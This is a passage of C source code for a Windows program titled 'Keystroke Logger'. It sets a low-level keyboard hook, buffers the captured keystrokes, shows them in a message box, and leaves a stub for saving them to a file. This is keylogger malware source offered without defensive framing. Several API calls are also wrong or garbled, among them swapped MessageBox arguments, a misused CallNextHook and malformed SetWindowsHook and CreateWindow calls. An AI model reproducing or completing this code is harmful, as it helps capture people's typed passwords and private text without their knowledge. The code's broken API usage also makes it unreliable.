                size_t len = strlen(buffer);
                if (len >= MAX_BUFFER_SIZE) {
                    buffer[0] = '\0';
                }
                // Display the latest keystroke in the window
                MessageBox(hwnd, "New keystroke:", buffer, MB_OK);
                // Append to file or other storage
                // (Add functionality here)
            }
        }
        CallNextHook(wParam, lParam);
    }
}

// Main function to set up and run the hook
int main() {
    // Register the window class
    RegisterClass(&wc);
    hwnd = CreateWindow(&wc, "Keystroke Logger", 0, 0, 0, 0, 0, 0, WS_OVERLAPPED | WS_VISIBLE | WS_MINIMIZE, NULL, NULL, 0, 0);

    // Set up the keyboard hook
    g_hook = SetWindowsHook(WH_KEYBOARD_LL, keyboardCallback);

    // Show the window
